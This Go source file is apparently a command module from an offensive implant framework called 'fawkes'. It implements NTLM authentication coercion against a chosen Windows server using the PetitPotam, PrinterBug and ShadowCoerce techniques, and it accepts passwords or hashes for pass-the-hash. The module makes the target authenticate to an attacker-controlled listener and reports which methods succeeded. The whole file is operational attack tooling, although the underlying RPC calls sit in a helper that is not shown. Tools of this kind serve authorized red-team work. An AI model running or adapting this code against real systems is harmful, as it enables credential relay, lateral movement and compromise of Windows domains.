package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

type CoerceCommand struct{}

func (c *CoerceCommand) Name() string { return "coerce" }
func (c *CoerceCommand) Description() string {
	return "NTLM authentication coercion via MS-EFSR/MS-RPRN/MS-FSRVP (T1187)"
}

type coerceArgs struct {
	Server   string `json:"server"`
	Listener string `json:"listener"`
	Method   string `json:"method"`
	Username string `json:"username"`
	Password string `json:"password"`
	Hash     string `json:"hash"`
	Domain   string `json:"domain"`
	Timeout  int    `json:"timeout"`
}

type coerceResult struct {
	Method  string
	Success bool
	Message string
}

func (c *CoerceCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use -server <target> -listener <attacker-ip> [-method petitpotam|printerbug|shadowcoerce|all]")
	}

	args, parseErr := unmarshalParams[coerceArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Server == "" || args.Listener == "" {
		return errorResult("Error: server and listener are required")
	}

	if args.Username == "" || (args.Password == "" && args.Hash == "") {
		return errorResult("Error: username and password (or hash) are required")
	}

	if args.Timeout <= 0 {
		args.Timeout = 30
	}

	if args.Method == "" {
		args.Method = "all"
	}
	args.Method = strings.ToLower(args.Method)

	if args.Domain == "" {
		args.Domain, args.Username = parseDomainUser(args.Username)
	}

	credUser := args.Username
	if args.Domain != "" {
		credUser = args.Domain + `\` + args.Username
	}

	authMethod := "password"
	if args.Hash != "" {
		authMethod = "PTH"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] NTLM coercion against %s → %s (%s)\n", args.Server, args.Listener, authMethod))
	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\n", credUser))
	sb.WriteString(strings.Repeat("-", 60) + "\n")

	var methods []string
	switch args.Method {
	case "petitpotam", "efsr":
		methods = []string{"petitpotam"}
	case "printerbug", "rprn", "spoolsample":
		methods = []string{"printerbug"}
	case "shadowcoerce", "fsrvp":
		methods = []string{"shadowcoerce"}
	case "all":
		methods = []string{"petitpotam", "printerbug", "shadowcoerce"}
	default:
		return errorf("Error: unknown method '%s'. Use petitpotam, printerbug, shadowcoerce, or all", args.Method)
	}

	successCount := 0
	for _, method := range methods {
		result := coerceViaSubprocess(args, method)
		if result.Success {
			successCount++
			sb.WriteString(fmt.Sprintf("[+] %s: %s\n", result.Method, result.Message))
		} else {
			sb.WriteString(fmt.Sprintf("[-] %s: %s\n", result.Method, result.Message))
		}
	}

	sb.WriteString(strings.Repeat("-", 60) + "\n")
	sb.WriteString(fmt.Sprintf("[*] %d/%d methods succeeded\n", successCount, len(methods)))

	if successCount > 0 {
		sb.WriteString("[*] Check your listener for incoming NTLM authentication\n")
	}

	status := "success"
	if successCount == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func coerceViaSubprocess(args coerceArgs, method string) coerceResult {
	params, _ := json.Marshal(coerceSubprocessParams{
		Listener: args.Listener,
		Method:   method,
	})

	output, err := rpcViaSubprocess(rpcHelperRequest{
		Operation: "coerce",
		Server:    args.Server,
		Username:  args.Username,
		Password:  args.Password,
		Hash:      args.Hash,
		Domain:    args.Domain,
		Timeout:   args.Timeout,
		Params:    params,
	})
	if err != nil {
		return coerceResult{
			Method:  method,
			Success: false,
			Message: fmt.Sprintf("subprocess error: %v", err),
		}
	}

	var result coerceSubprocessResult
	if err := json.Unmarshal(output, &result); err != nil {
		return coerceResult{
			Method:  method,
			Success: false,
			Message: fmt.Sprintf("parse error: %v", err),
		}
	}

	return coerceResult(result)
}
